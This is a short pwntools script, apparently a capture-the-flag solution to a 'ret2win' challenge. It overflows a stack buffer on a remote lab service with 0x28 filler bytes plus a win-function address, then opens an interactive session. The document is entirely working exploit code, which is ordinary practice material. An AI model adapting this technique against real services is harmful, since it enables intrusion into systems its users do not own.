from pwn import *

r = remote('172.31.210.1', 50001)
# r = process('./ret2win')

r.recvline()

fn_win_addr = 0x000000000401196
r.sendline(b'a' * 0x28 + p64(fn_win_addr))
r.interactive()